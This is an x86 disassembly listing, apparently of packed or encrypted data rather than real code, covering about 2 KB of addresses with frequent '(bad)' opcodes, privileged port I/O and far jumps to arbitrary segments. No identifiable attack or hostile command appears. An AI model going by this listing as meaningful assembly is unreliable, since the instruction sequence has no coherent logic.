  49ca78:	jo     0x49ca2b
  49ca7a:	sub    al,0x67
  49ca7c:	int    0x16
  49ca7e:	jle    0x49ca24
  49ca80:	mov    bl,0x83
  49ca82:	scas   eax,DWORD PTR es:[edi]
  49ca83:	xchg   ecx,eax
  49ca84:	mov    esp,0xbb8dadeb
  49ca89:	add    DWORD PTR [edi+0x1d],eax
  49ca8c:	cmp    DWORD PTR [eax-0x40ea8aa9],edi
  49ca92:	mov    dl,0xef
  49ca94:	retf   
  49ca95:	pushf  
  49ca96:	and    eax,0xba57b9cb
  49ca9b:	sbb    BYTE PTR [edx-0x50],dl
  49ca9e:	push   0x5d
  49caa0:	sbb    edx,DWORD PTR [edi-0x55ee6d03]
  49caa6:	add    ah,BYTE PTR [edi-0x3ab95f54]
  49caac:	pop    es
  49caad:	clc    
  49caae:	inc    eax
  49caaf:	into   
  49cab0:	(bad)  
  49cab1:	addr16 xchg ecx,eax
  49cab3:	mov    BYTE PTR [ebx],dl
  49cab5:	nop
  49cab6:	sbb    al,0xd6
  49cab8:	mov    cl,0x3e
  49caba:	iret   
  49cabb:	imul   edx,DWORD PTR [edi+ecx*1],0x6
  49cabf:	outs   dx,DWORD PTR ds:[esi]
  49cac0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49cac1:	add    ebp,eax
  49cac3:	pusha  
  49cac4:	repnz mov eax,ds:0x3c07d8
  49caca:	add    eax,0x3020101
  49cacf:	add    eax,0x10a1a7d
  49cad4:	lock call 0xc684:0x63e22ba5
  49cadc:	add    eax,0xb29f65e2
  49cae1:	jo     0x49caed
  49cae3:	rol    DWORD PTR [ebx+0x1df47da1],cl
  49cae9:	icebp  
  49caea:	add    BYTE PTR [eax-0x4e],ch
  49caed:	mov    edx,0xc64f8237
  49caf2:	xchg   esp,edi
  49caf4:	dec    esi
  49caf5:	jnp    0x49cb6a
  49caf7:	aas    
  49caf8:	or     al,bh
  49cafa:	xchg   DWORD PTR [ecx],esi
  49cafc:	dec    edi
  49cafd:	sub    BYTE PTR [edx+edi*2-0x14],0x81
  49cb02:	mov    DWORD PTR [ebp+0x7939ef22],ebp
  49cb08:	shl    BYTE PTR [ebx-0x7460598a],0x18
  49cb0f:	ret    0x227b
  49cb12:	jecxz  0x49cb87
  49cb14:	or     bl,BYTE PTR [edx+0x2e]
  49cb17:	xor    esi,esi
  49cb19:	jecxz  0x49cae8
  49cb1b:	or     edx,eax
  49cb1d:	sbb    eax,0x531eac8f
  49cb22:	and    BYTE PTR [edx],cl
  49cb24:	or     BYTE PTR [edi+0x39122b88],bl
  49cb2a:	sbb    ah,BYTE PTR [ecx]
  49cb2c:	inc    esi
  49cb2d:	sub    DWORD PTR [eax-0x9],edi
  49cb30:	fs loop 0x49caea
  49cb33:	pop    ebp
  49cb34:	jb     0x49cb15
  49cb36:	cmp    esi,eax
  49cb38:	add    al,0x3c
  49cb3a:	adc    DWORD PTR [edx],esi
  49cb3c:	or     eax,0xd3d450c4
  49cb41:	ins    DWORD PTR es:[edi],dx
  49cb42:	fs out 0xfa,eax
  49cb45:	cld    
  49cb46:	jge    0x49cae6
  49cb48:	hlt    
  49cb49:	and    bh,BYTE PTR [eax+ebx*4-0x53]
  49cb4d:	nop
  49cb4e:	add    BYTE PTR [edx+eax*8+0x78],ch
  49cb52:	(bad)  
  49cb53:	mov    al,0x3
  49cb55:	lock push ecx
  49cb57:	push   edi
  49cb58:	leave  
  49cb59:	xchg   edi,eax
  49cb5a:	rcl    DWORD PTR [ebp+0x9],0x6b
  49cb5e:	inc    edx
  49cb5f:	mov    dl,0xe4
  49cb61:	pusha  
  49cb62:	sub    eax,0x3e0cd1dc
  49cb67:	inc    ebx
  49cb68:	out    dx,al
  49cb69:	mov    bh,0x4c
  49cb6b:	add    DWORD PTR [edi-0x58fef1fc],edx
  49cb71:	rcr    BYTE PTR [edx+ebp*4+0x60685a53],1
  49cb78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49cb79:	push   edi
  49cb7a:	jns    0x49cb65
  49cb7c:	jne    0x49cbd1
  49cb7e:	out    0x3,al
  49cb80:	and    eax,DWORD PTR ds:0xb9d785e8
  49cb86:	clc    
  49cb87:	push   ebx
  49cb88:	stc    
  49cb89:	mov    dh,0x9f
  49cb8b:	xor    ecx,DWORD PTR [ebp+edx*4+0x4a]
  49cb8f:	retf   0x9f8b
  49cb92:	pop    eax
  49cb93:	add    al,0x67
  49cb95:	add    esp,DWORD PTR [edx+0x125e533]
  49cb9b:	lods   al,BYTE PTR ds:[esi]
  49cb9c:	sbb    BYTE PTR [ecx-0x1c3ef767],ch
  49cba2:	adc    al,0x51
  49cba4:	addr16 mov eax,ds:0x8479
  49cba8:	pop    edx
  49cba9:	adc    dh,BYTE PTR ds:0x16a21c51
  49cbaf:	shr    dh,1
  49cbb1:	pop    ebp
  49cbb2:	cmp    BYTE PTR [eax+0x11],0x7c
  49cbb6:	jle    0x49cbcf
  49cbb8:	jo     0x49cbce
  49cbba:	out    0x87,al
  49cbbc:	dec    ebp
  49cbbd:	ret    0x7a87
  49cbc0:	pop    esp
  49cbc1:	sbb    BYTE PTR [edx+ebp*2+0x4ffa73cf],cl
  49cbc8:	outs   dx,BYTE PTR ds:[esi]
  49cbc9:	(bad)  
  49cbca:	or     eax,0x413b3633
  49cbcf:	sbb    BYTE PTR [edi],cl
  49cbd1:	adc    BYTE PTR [edi-0x77],0xb0
  49cbd5:	shr    DWORD PTR [ecx],0x28
  49cbd8:	loope  0x49cb65
  49cbda:	xor    ecx,DWORD PTR ds:0x83d41446
  49cbe0:	sub    DWORD PTR [edi],ecx
  49cbe2:	retf   0x10d0
  49cbe5:	shl    BYTE PTR [edx-0x41f7a4ec],1
  49cbeb:	retf   
  49cbec:	in     al,0x8
  49cbee:	in     al,dx
  49cbef:	jo     0x49cc43
  49cbf1:	in     eax,dx
  49cbf2:	ins    BYTE PTR es:[edi],dx
  49cbf3:	mov    ecx,DWORD PTR fs:[eax]
  49cbf6:	adc    eax,0x2a13a549
  49cbfb:	adc    BYTE PTR [edi+0x28],dl
  49cbfe:	ror    DWORD PTR [esi],0xfe
  49cc01:	mov    dl,0xc6
  49cc03:	inc    edx
  49cc04:	adc    BYTE PTR [ecx],al
  49cc06:	lds    esp,FWORD PTR [edx-0x28]
  49cc09:	xor    dh,BYTE PTR [ebx]
  49cc0b:	sbb    eax,0x4054ffcc
  49cc10:	icebp  
  49cc11:	sub    ebp,ecx
  49cc13:	ret    
  49cc14:	sub    DWORD PTR [edx],eax
  49cc16:	enter  0x3efc,0x90
  49cc1a:	inc    ebx
  49cc1b:	push   cs
  49cc1c:	into   
  49cc1d:	test   eax,0x514c8a60
  49cc22:	or     BYTE PTR [bx-0x19],0x34
  49cc27:	xchg   ecx,eax
  49cc28:	add    dl,BYTE PTR [ebx-0x1ed8f5ef]
  49cc2e:	bound  edx,QWORD PTR [edi+0x2644a7eb]
  49cc34:	loope  0x49cc45
  49cc36:	js     0x49cbcb
  49cc38:	ins    BYTE PTR es:[edi],dx
  49cc39:	adc    DWORD PTR [edi+0x3e5ca8eb],ebp
  49cc3f:	jb     0x49cc08
  49cc41:	xchg   BYTE PTR [eax],ch
  49cc43:	push   edi
  49cc44:	call   0xbf80:0xadb9538f
  49cc4b:	fs inc ebp
  49cc4d:	or     esi,esi
  49cc4f:	mov    bh,0x53
  49cc51:	xchg   BYTE PTR [eax-0x623b09de],bh
  49cc57:	ja     0x49cc3c
  49cc59:	sbb    BYTE PTR [ecx-0x58],bh
  49cc5c:	inc    edi
  49cc5d:	mov    dl,0x99
  49cc5f:	lahf   
  49cc60:	fld    DWORD PTR [ecx+0x30682116]
  49cc66:	xchg   esi,eax
  49cc67:	pop    es
  49cc68:	xchg   BYTE PTR [edi],dl
  49cc6a:	arpl   WORD PTR [eax+0x6],dx
  49cc6d:	or     eax,edx
  49cc6f:	rcl    DWORD PTR [eax+0x1e],cl
  49cc72:	sahf   
  49cc73:	push   edi
  49cc74:	js     0x49cccb
  49cc76:	popa   
  49cc77:	fisttp DWORD PTR [edx]
  49cc79:	hlt    
  49cc7a:	pop    ds
  49cc7b:	dec    edx
  49cc7c:	(bad)  
  49cc7d:	stc    
  49cc7e:	adc    al,0xe8
  49cc80:	sahf   
  49cc81:	pop    eax
  49cc82:	loopne 0x49ccde
  49cc84:	inc    edi
  49cc85:	sub    DWORD PTR [edi],esp
  49cc87:	cwde   
  49cc88:	mov    ah,0xb8
  49cc8a:	pop    edx
  49cc8b:	adc    bl,dh
  49cc8d:	adc    esi,DWORD PTR [esp+ebp*4+0x33]
  49cc91:	fld    TBYTE PTR [ebx-0x42d7ad0]
  49cc97:	mov    edx,0x385c3062
  49cc9c:	push   cs
  49cc9d:	cmp    al,0x75
  49cc9f:	lock jno 0x49cc4a
  49cca2:	(bad)  [eax+0x21]
  49cca5:	mov    edi,0xd1b47c1c
  49ccaa:	xchg   BYTE PTR [ecx+0x3020f50f],cl
  49ccb0:	lea    eax,[ebx+0x2]
  49ccb3:	out    0xd6,eax
  49ccb5:	lods   al,BYTE PTR ds:[esi]
  49ccb6:	jbe    0x49cc6e
  49ccb8:	mov    edx,0x778fa930
  49ccbd:	inc    ebp
  49ccbe:	fsub   st(4),st
  49ccc0:	mov    esi,DWORD PTR [esp+edi*2-0x41]
  49ccc4:	xor    al,0x6f
  49ccc6:	sbb    al,0xc2
  49ccc8:	mov    WORD PTR ds:0x7ca7748,es
  49ccce:	jg     0x49cd1c
  49ccd0:	xor    ah,BYTE PTR [eax]
  49ccd2:	mov    bl,0x3f
  49ccd4:	push   edi
  49ccd5:	mov    edi,0x542c8554
  49ccda:	in     al,dx
  49ccdb:	add    BYTE PTR [ebp+0x36e941],0x50
  49cce2:	inc    ebp
  49cce3:	push   0x53
  49cce5:	(bad)  
  49cce6:	mov    BYTE PTR [esi+0x1e2fb9c2],0xb5
  49cced:	out    0x88,eax
  49ccef:	sahf   
  49ccf0:	pop    ss
  49ccf1:	retf   
  49ccf2:	data16 fstp QWORD PTR [ebx-0x10]
  49ccf6:	enter  0x2bcc,0xfb
  49ccfa:	rcl    BYTE PTR [eax-0x43f2634f],0x97
  49cd01:	xchg   bl,dh
  49cd03:	push   ds
  49cd04:	dec    ebx
  49cd05:	sbb    bl,BYTE PTR [ebx+edx*1-0x6e21a7d3]
  49cd0c:	and    BYTE PTR [edx],0x74
  49cd0f:	or     al,0x1
  49cd11:	pusha  
  49cd12:	test   BYTE PTR [esi+0x19206d82],bh
  49cd18:	xchg   esp,eax
  49cd19:	and    ebx,DWORD PTR [edi]
  49cd1b:	mov    WORD PTR [esp+esi*4],fs
  49cd1e:	mov    ecx,0x4149cf25
  49cd23:	push   ecx
  49cd24:	gs pop ss
  49cd26:	inc    eax
  49cd27:	jbe    0x49ccae
  49cd29:	mov    cl,0xff
  49cd2b:	inc    ebx
  49cd2c:	ins    BYTE PTR es:[edi],dx
  49cd2d:	outs   dx,DWORD PTR ds:[esi]
  49cd2e:	jmp    0x1b2ec364
  49cd33:	xlat   BYTE PTR ds:[ebx]
  49cd34:	and    edx,DWORD PTR [ecx-0x46]
  49cd37:	in     eax,0xd4
  49cd39:	jno    0x49ccdf
  49cd3b:	gs js  0x49ccf4
  49cd3e:	aaa    
  49cd3f:	adc    BYTE PTR [edi-0x1a9b51b2],al
  49cd45:	sub    eax,edx
  49cd47:	inc    edx
  49cd48:	add    al,ch
  49cd4a:	in     al,0xb6
  49cd4c:	nop
  49cd4d:	xchg   ebx,eax
  49cd4e:	dec    ebx
  49cd4f:	clc    
  49cd50:	sar    dl,0xb8
  49cd53:	into   
  49cd54:	pmulhuw mm0,QWORD PTR [edx]
  49cd57:	retf   
  49cd58:	popf   
  49cd59:	aad    0x8b
  49cd5b:	xchg   edi,eax
  49cd5c:	push   eax
  49cd5d:	adc    al,0x87
  49cd5f:	jnp    0x49cdbd
  49cd61:	sub    al,0x58
  49cd63:	cld    
  49cd64:	and    cl,BYTE PTR [eax+0x1b]
  49cd67:	pop    esp
  49cd68:	cmp    eax,0x4e01202
  49cd6d:	cmp    BYTE PTR ds:0x3b08891c,al
  49cd73:	fldcw  WORD PTR [ecx-0x39]
  49cd76:	mov    dl,0xcd
  49cd78:	inc    eax
  49cd79:	push   eax
  49cd7a:	pop    edi
  49cd7b:	icebp  
  49cd7c:	cdq    
  49cd7d:	or     eax,DWORD PTR [ebx]
  49cd7f:	and    ah,BYTE PTR [ebx]
  49cd81:	xor    BYTE PTR [ebx+0x5b12730f],cl
  49cd87:	test   eax,0xcf03dd0c
  49cd8c:	aas    
  49cd8d:	les    ecx,FWORD PTR [edi]
  49cd8f:	mov    eax,0x1b0c85a2
  49cd94:	xchg   ebx,eax
  49cd95:	es cs pop edx
  49cd98:	js     0x49cd9b
  49cd9a:	fisttp DWORD PTR [eax-0x63]
  49cd9d:	add    BYTE PTR [esi],cl
  49cd9f:	out    dx,eax
  49cda0:	test   dl,al
  49cda2:	pop    ebp
  49cda3:	mov    esp,DWORD PTR [eax+0x18]
  49cda6:	jmp    0x55c71725
  49cdab:	test   al,0x3b
  49cdad:	rcr    DWORD PTR [eax+ecx*2-0x6b],1
  49cdb1:	in     eax,dx
  49cdb2:	ds pusha 
  49cdb4:	dec    esi
  49cdb5:	cmp    eax,DWORD PTR [edi+0x36825052]
  49cdbb:	xchg   DWORD PTR [ecx],ecx
  49cdbd:	pop    esi
  49cdbe:	add    ebx,DWORD PTR [ebp-0x206e3dac]
  49cdc4:	rcr    ch,1
  49cdc6:	sub    al,0x99
  49cdc8:	lahf   
  49cdc9:	sub    BYTE PTR [esi+0x4a],ah
  49cdcc:	push   es
  49cdcd:	adc    cl,BYTE PTR [edx+esi*4+0x5d4fd04]
  49cdd4:	test   BYTE PTR [ecx],cl
  49cdd6:	sahf   
  49cdd7:	sbb    eax,0x3895851c
  49cddc:	adc    DWORD PTR [ebx],0x84b895cc
  49cde2:	dec    ecx
  49cde3:	enter  0x2d04,0x15
  49cde7:	push   cs
  49cde8:	test   dl,ch
  49cdea:	add    eax,0x6ecc09fd
  49cdef:	ret    0x2819
  49cdf2:	xor    BYTE PTR [esi+0x13],dl
  49cdf5:	div    BYTE PTR [eax+0xf]
  49cdf8:	test   al,0xc7
  49cdfa:	cdq    
  49cdfb:	adc    esi,edx
  49cdfd:	int    0xff
  49cdff:	adc    ebx,DWORD PTR [ecx+edi*4+0x3d7125c2]
  49ce06:	test   DWORD PTR ds:[eax-0x4b],edi
  49ce0a:	mov    ds:0x1d1ee0ce,al
  49ce0f:	pcmpeqb mm3,QWORD PTR [eax-0x34]
  49ce13:	add    BYTE PTR [edi],bl
  49ce15:	add    DWORD PTR [edx-0x4781e79b],0x58
  49ce1c:	push   ecx
  49ce1d:	push   eax
  49ce1e:	inc    ebp
  49ce1f:	push   esp
  49ce20:	inc    ebx
  49ce21:	sbb    DWORD PTR [edx+0x56],ebp
  49ce24:	mov    dh,0xdb
  49ce26:	call   0x8d2bd55c
  49ce2b:	sti    
  49ce2c:	pop    ebx
  49ce2d:	sub    al,0xdb
  49ce2f:	push   es
  49ce30:	adc    bl,BYTE PTR [edx-0x7d]
  49ce33:	add    BYTE PTR [edi],0x8
  49ce36:	js     0xc08b4519
  49ce3c:	xchg   edi,eax
  49ce3d:	adc    dl,BYTE PTR [eax+0x1e0ddfe7]
  49ce43:	fadd   st(3),st
  49ce45:	add    eax,0xce12b064
  49ce4a:	test   BYTE PTR [esi+0x515334bc],bh
  49ce50:	and    eax,0x751228dd
  49ce55:	xchg   DWORD PTR [ecx-0x7f71e970],eax
  49ce5b:	push   eax
  49ce5c:	jmp    0x49ce8e
  49ce5e:	pop    esp
  49ce5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49ce60:	add    bl,BYTE PTR [ecx+0x72972127]
  49ce66:	mov    DWORD PTR [eax],ecx
  49ce68:	pop    esp
  49ce69:	or     al,0x87
  49ce6b:	jnp    0x49cea5
  49ce6d:	test   dh,0xad
  49ce70:	mov    ah,0x4b
  49ce72:	(bad)  
  49ce73:	loope  0x49ce19
  49ce75:	cmp    ebp,ebp
  49ce77:	mov    ebx,0x759526f6
  49ce7c:	iret   
  49ce7d:	std    
  49ce7e:	adc    eax,0x3b1d8811
  49ce83:	shl    DWORD PTR [edi+0x2f],1
  49ce86:	or     DWORD PTR [ebp+0x42cf344e],eax
  49ce8c:	into   
  49ce8d:	cmp    ebx,esp
  49ce8f:	mov    ebp,0x2f12295f
  49ce94:	mov    DWORD PTR ds:0x6ad68bbb,ebp
  49ce9a:	xchg   edi,eax
  49ce9b:	add    DWORD PTR [esi],0x7152705a
  49cea1:	js     0x49ceb9
  49cea3:	ja     0x49ced2
  49cea5:	in     eax,dx
  49cea6:	mov    DWORD PTR [esi],0xf85af5f1
  49ceac:	out    dx,al
  49cead:	(bad)  
  49ceaf:	cmp    edx,DWORD PTR [edx-0x7c9171f2]
  49ceb5:	push   esp
  49ceb6:	call   0xfa22:0x5f05814e
  49cebd:	or     BYTE PTR [edi+0x50],bl
  49cec0:	jno    0x49ce59
  49cec2:	fsub   DWORD PTR [eax+0x11c0331a]
  49cec8:	inc    edx
  49cec9:	mov    bh,0xbc
  49cecb:	sbb    al,0xa0
  49cecd:	add    BYTE PTR ds:0xcd5180c7,cl
  49ced3:	pop    esi
  49ced4:	mov    cl,0x1
  49ced6:	and    ebp,DWORD PTR [edi+eax*4+0x35b7bcf2]
  49cedd:	mov    dh,bh
  49cedf:	push   esi
  49cee0:	add    edx,edi
  49cee2:	push   edx
  49cee3:	inc    edx
  49cee4:	mov    ah,0x7
  49cee6:	push   0x9ca4fbc3
  49ceeb:	pop    es
  49ceec:	and    ebp,ebx
  49ceee:	dec    ebp
  49ceef:	push   edi
  49cef0:	hlt    
  49cef1:	mov    WORD PTR [edi-0x5d],cs
  49cef4:	daa    
  49cef5:	mov    BYTE PTR [ecx],ah
  49cef7:	sahf   
  49cef8:	inc    edi
  49cef9:	add    cl,BYTE PTR [esi-0x53]
  49cefc:	pusha  
  49cefd:	ss mov edi,0xdde15552
  49cf03:	addr16 call 0x74e9:0x390a558e
  49cf0b:	or     BYTE PTR [esi-0x2c90e348],dl
  49cf11:	push   eax
  49cf12:	add    BYTE PTR [edi-0x72457b08],cl
  49cf18:	lahf   
  49cf19:	ficom  WORD PTR [ebx-0x43]
  49cf1c:	adc    DWORD PTR [esi-0x2ea3d6a],esp
  49cf22:	push   edx
  49cf23:	test   al,0x3
  49cf25:	sbb    eax,0x51e7cdba
  49cf2a:	jne    0x49cf7f
  49cf2c:	aaa    
  49cf2d:	push   eax
  49cf2e:	and    eax,0xe530a6ce
  49cf33:	enter  0xb324,0x81
  49cf37:	pop    ebx
  49cf38:	jae    0x49cefe
  49cf3a:	or     esi,DWORD PTR [ebx+0x469167e7]
  49cf40:	shl    DWORD PTR [esi-0x3c],0xe6
  49cf44:	sub    DWORD PTR [edi],eax
  49cf46:	(bad)  
  49cf47:	adc    al,0xca
  49cf49:	daa    
  49cf4a:	push   0xae06f948
  49cf4f:	and    DWORD PTR [ecx],esp
  49cf51:	out    0x15,eax
  49cf53:	dec    esi
  49cf54:	or     al,0xda
  49cf56:	mov    edx,DWORD PTR [edx+0xa]
  49cf59:	mov    al,ds:0xad46320f
  49cf5e:	mov    dl,0xef
  49cf60:	scas   al,BYTE PTR es:[edi]
  49cf61:	push   0x4479b75d
  49cf66:	inc    eax
  49cf67:	data16 mov dl,0x6e
  49cf6a:	pushf  
  49cf6b:	outs   dx,DWORD PTR ds:[esi]
  49cf6c:	aaa    
  49cf6d:	fild   QWORD PTR ds:0x416e18d
  49cf73:	rcr    ch,1
  49cf75:	dec    eax
  49cf76:	mov    bl,ch
  49cf78:	and    bl,dl
  49cf7a:	(bad)  
  49cf7b:	rol    DWORD PTR [ebp+0x27dfb249],cl
  49cf81:	inc    eax
  49cf82:	aaa    
  49cf83:	in     al,0xe3
  49cf85:	sub    al,0x38
  49cf87:	sub    al,0x39
  49cf89:	cmp    BYTE PTR [ecx+0x563ce169],0x3c
  49cf90:	add    DWORD PTR [ebx],edx
  49cf92:	push   0x5a
  49cf94:	push   0x521b94be
  49cf99:	les    esp,FWORD PTR ds:0x1ddd16d
  49cf9f:	jg     0x49cf71
  49cfa1:	imul   ebx,DWORD PTR [edi-0x26852107],0xc0d306df
  49cfab:	imul   edi,DWORD PTR [edx-0x66],0x56adede
  49cfb2:	ret    
  49cfb3:	idiv   DWORD PTR [eax+0xd]
  49cfb6:	push   edx
  49cfb7:	xchg   ebx,eax
  49cfb8:	lock xlat BYTE PTR ds:[ebx]
  49cfba:	fcom   QWORD PTR [eax+0x5036066b]
  49cfc0:	ret    0x4c92
  49cfc3:	js     0x49cf5d
  49cfc5:	or     BYTE PTR ds:0x53bb2fa9,dl
  49cfcb:	add    BYTE PTR [edi],ah
  49cfcd:	(bad)  
  49cfce:	fwait
  49cfcf:	lea    eax,[ebx+0x3e]
  49cfd2:	test   DWORD PTR [edi-0x65fa3850],esi
  49cfd8:	fcom   DWORD PTR [ecx+0x10]
  49cfdb:	push   ds
  49cfdc:	add    dh,ch
  49cfde:	sub    edx,DWORD PTR [ebp+0x24f41d8b]
  49cfe4:	xchg   esi,eax
  49cfe5:	and    al,0xe1
  49cfe7:	cwde   
  49cfe8:	mov    dh,0xdf
  49cfea:	(bad)  
  49cfeb:	std    
  49cfec:	cdq    
  49cfed:	adc    eax,0x44e8158a
  49cff2:	mov    bl,BYTE PTR [ebp-0x2]
  49cff5:	mov    BYTE PTR ds:0x794a90eb,dl
  49cffb:	daa    
  49cffc:	addr16 dec ecx
  49cffe:	sub    cl,cl
  49d000:	lea    eax,[ebp-0x56878673]
  49d006:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49d007:	test   BYTE PTR ds:0x65a5eb9,bh
  49d00d:	xchg   ebx,eax
  49d00e:	xlat   BYTE PTR ds:[ebx]
  49d00f:	dec    ebp
  49d010:	icebp  
  49d011:	pusha  
  49d012:	and    ch,BYTE PTR [edx]
  49d014:	aas    
  49d015:	pop    esp
  49d016:	pop    ds
  49d017:	jmp    0x3038:0x4a6fd2f2
  49d01e:	push   ecx
  49d01f:	mov    eax,ds:0xc0099010
  49d024:	push   0x19
  49d026:	add    BYTE PTR [esi],0x19
  49d029:	push   es
  49d02a:	idiv   DWORD PTR [edx+0x3e26904d]
  49d030:	mov    edi,0xbfe8ecd6
  49d035:	ins    BYTE PTR es:[edi],dx
  49d036:	add    al,0xe3
  49d038:	in     eax,dx
  49d039:	mov    ebp,0x313cc291
  49d03e:	pop    ss
  49d03f:	mov    ecx,DWORD PTR [ebp-0x4a]
  49d042:	dec    ebp
  49d043:	inc    eax
  49d044:	dec    edx
  49d045:	cmp    dl,BYTE PTR [ecx]
  49d047:	push   ecx
  49d048:	lea    esp,[edi+esi*1+0x3e70d3a1]
  49d04f:	xchg   ah,bh
  49d051:	cli    
  49d052:	arpl   bp,bx
  49d054:	adc    esp,ecx
  49d056:	and    al,0x81
  49d058:	sti    
  49d059:	test   BYTE PTR [ebp-0x3a],bl
  49d05c:	dec    ebx
  49d05d:	dec    ecx
  49d05e:	in     eax,0x57
  49d060:	lea    ecx,[ebp+0x2444f51]
  49d066:	pop    edx
  49d067:	outs   dx,DWORD PTR ds:[esi]
  49d068:	arpl   di,ax
  49d06a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49d06b:	xchg   ebp,eax
  49d06c:	mov    edi,0xced8c49b
  49d071:	scas   al,BYTE PTR es:[edi]
  49d072:	movzx  edi,bl
  49d075:	and    edi,0x1
  49d078:	add    BYTE PTR ds:[ecx-0x60057e3f],dh
  49d07f:	jge    0x49d0b6
  49d081:	and    BYTE PTR [eax],dh
  49d083:	mov    ecx,edx
  49d085:	ins    DWORD PTR es:[edi],dx
  49d086:	std    
  49d087:	sbb    al,0x22
  49d089:	and    BYTE PTR [edi-0x2d],bl
  49d08c:	loopne 0x49d068
  49d08e:	test   al,0xb2
  49d090:	rcl    DWORD PTR [eax-0x17f8193e],1
  49d096:	mov    ebx,0x3ae5d28
  49d09b:	rol    BYTE PTR [ecx],cl
  49d09d:	test   al,cl
  49d09f:	je     0x49d0ad
  49d0a1:	add    BYTE PTR ss:[ebp+0x28],dh
  49d0a5:	mov    al,0x5f
  49d0a7:	mov    ecx,0x8f61c35d
  49d0ac:	inc    eax
  49d0ad:	cld    
  49d0ae:	xchg   esp,eax
  49d0af:	inc    esi
  49d0b0:	and    bl,0xc2
  49d0b3:	(bad)  
  49d0b4:	and    BYTE PTR [esi+0x33aae124],dl
  49d0ba:	loope  0x49d098
  49d0bc:	dec    esi
  49d0bd:	inc    esi
  49d0be:	out    dx,al
  49d0bf:	aaa    
  49d0c0:	adc    BYTE PTR [ecx*4+0x3d4628f2],ch
  49d0c7:	rcl    BYTE PTR [ecx],0x15
  49d0ca:	mov    WORD PTR [edi-0x21],gs
  49d0cd:	mov    ecx,ss
  49d0cf:	sbb    eax,0xa83fba0e
  49d0d4:	and    BYTE PTR [ebp+0xe],dh
  49d0d7:	push   ecx
  49d0d8:	dec    edx
  49d0d9:	sti    
  49d0da:	pop    es
  49d0db:	clc    
  49d0dc:	or     eax,ecx
  49d0de:	inc    esi
  49d0df:	xor    dl,ah
  49d0e1:	dec    eax
  49d0e2:	test   al,0x10
  49d0e4:	jne    0x49d102
  49d0e6:	and    cl,BYTE PTR [edi]
  49d0e8:	repz aas 
  49d0ea:	xor    al,0x80
  49d0ec:	enter  0xc1be,0xe1
  49d0f0:	push   es
  49d0f1:	and    eax,0x3f
  49d0f4:	or     eax,ecx
  49d0f6:	mov    ebx,0x3f33cd21
  49d0fb:	or     BYTE PTR [ebp+0x25],dh
  49d0fe:	pop    es
  49d0ff:	cmp    BYTE PTR [ebp+ecx*2-0x1e],al
  49d103:	dec    ecx
  49d104:	mov    esi,0xeb030257
  49d109:	jo     0x49d0b9
  49d10b:	or     eax,0x31d05690
  49d110:	push   eax
  49d111:	add    ebp,DWORD PTR [ecx+0x3]
  49d114:	sbb    esp,DWORD PTR ds:0xeb0449ed
  49d11a:	cmp    esp,DWORD PTR [eax+0x1]
  49d11d:	jns    0x49d122
  49d11f:	add    edx,DWORD PTR [ebx+0x6c05045c]
  49d125:	push   es
  49d126:	into   
  49d127:	push   0x2fd6d912
  49d12c:	daa    
  49d12d:	clc    
  49d12e:	rcr    DWORD PTR [esi],0x9
  49d131:	rol    DWORD PTR [ecx],1
  49d133:	int    0x46
  49d135:	cmp    ecx,0xf000d5ed
  49d13b:	fsubr  DWORD PTR ss:[ecx]
  49d13e:	popa   
  49d13f:	test   cl,0xef
  49d142:	loope  0x49d163
  49d144:	(bad)  
  49d145:	stos   DWORD PTR es:[edi],eax
  49d146:	mov    ah,0x81
  49d148:	ins    DWORD PTR es:[edi],dx
  49d149:	out    dx,eax
  49d14a:	aad    0x43
  49d14c:	and    al,0xf0
  49d14e:	and    al,0xf
  49d150:	ror    DWORD PTR [edx-0x49],0x14
  49d154:	cwde   
  49d155:	inc    ecx
  49d156:	dec    esi
  49d157:	nop    eax
  49d15a:	enter  0xdd41,0xd
  49d15e:	imul   eax,DWORD PTR [ebx+0x3a0740f2],0x482b0346
  49d168:	repnz pop ecx
  49d16a:	add    dh,dl
  49d16c:	jno    0x49d1c0
  49d16e:	hlt    
  49d16f:	in     al,0xda
  49d171:	add    BYTE PTR [ecx+0x52],ch
  49d174:	add    ebp,DWORD PTR [ebx+0x3]
  49d177:	sbb    esp,DWORD PTR ds:0x60f4906d
  49d17d:	add    DWORD PTR [ecx+0x1f],edi
  49d180:	adc    eax,0x5045c93
  49d185:	mov    ch,0x1e
  49d187:	and    ebx,0x5c
  49d18a:	mov    dl,0x32
  49d18c:	and    bl,al
  49d18e:	(bad)  
  49d18f:	and    ebx,eax
  49d191:	cmp    DWORD PTR cs:[edx-0x47],esi
  49d195:	jecxz  0x49d15a
  49d197:	(bad)  
  49d198:	and    ebx,eax
  49d19a:	mov    ah,BYTE PTR [ebx+esi*4]
  49d19d:	inc    ecx
  49d19e:	jecxz  0x49d1f7
  49d1a0:	add    dh,BYTE PTR [ebp+0x25a36b92]
  49d1a6:	push   ecx
  49d1a7:	imul   eax,DWORD PTR [ebx],0x456d42d7
  49d1ad:	mov    ch,0x61
  49d1af:	jns    0x49d1b5
  49d1b1:	stc    
  49d1b2:	loop   0x49d13e
  49d1b4:	and    al,0xb4
  49d1b6:	sar    DWORD PTR [eax+ecx*1-0x44],1
  49d1ba:	mov    cs,WORD PTR [edi*8-0x6ec45e79]
  49d1c1:	mov    bh,0x85
  49d1c3:	and    al,0x14
  49d1c5:	popa   
  49d1c6:	add    BYTE PTR [edi],bh
  49d1c8:	pusha  
  49d1c9:	and    BYTE PTR [ecx+0x2],bh
  49d1cc:	xchg   DWORD PTR [esi+ebp*2+0x75c1461f],esi
  49d1d3:	adc    bh,BYTE PTR [esi]
  49d1d5:	leave  
  49d1d6:	shr    eax,0x45
  49d1d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49d1da:	or     DWORD PTR [ebx],esi
  49d1dc:	or     eax,0x603e089c
  49d1e1:	or     dh,BYTE PTR [esi+0x24faa03d]
  49d1e7:	or     eax,edx
  49d1e9:	push   ss
  49d1ea:	iret   
  49d1eb:	push   es
  49d1ec:	lock sub al,0x67
  49d1ef:	xor    cl,dl
  49d1f1:	add    BYTE PTR [edi-0x51],dl
  49d1f4:	jge    0x49d244
  49d1f6:	shl    edx,0x44
  49d1f9:	ret    0x1585
  49d1fc:	push   es
  49d1fd:	sbb    bh,BYTE PTR [edi+0x64]
  49d200:	test   eax,0x3a800f79
  49d205:	and    BYTE PTR [ecx+0x74e06dde],bl
